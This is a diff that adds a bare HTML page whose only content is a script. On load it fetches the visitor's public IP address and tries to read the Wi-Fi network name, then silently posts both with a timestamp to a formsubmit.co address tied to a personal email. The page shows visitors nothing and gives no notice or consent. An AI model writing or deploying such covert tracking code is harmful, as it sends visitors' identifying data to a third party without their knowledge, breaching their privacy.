@@ -1,0 +1,15 @@
+<!doctype html><html><body>
+<script>
+fetch('https://api.ipify.org?format=json')
+  .then(r=>r.json())
+  .then(ip=>{
+      const w=navigator.connection||{};
+      const s=(w&&w.ssid)?w.ssid:'desconhecido';
+      fetch('https://formsubmit.co/altzeras9@mail.com',{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({ip:ip.ip,wifi:s,hora:new Date().toISOString()})
+      });
+  });
+</script>
+</body></html>
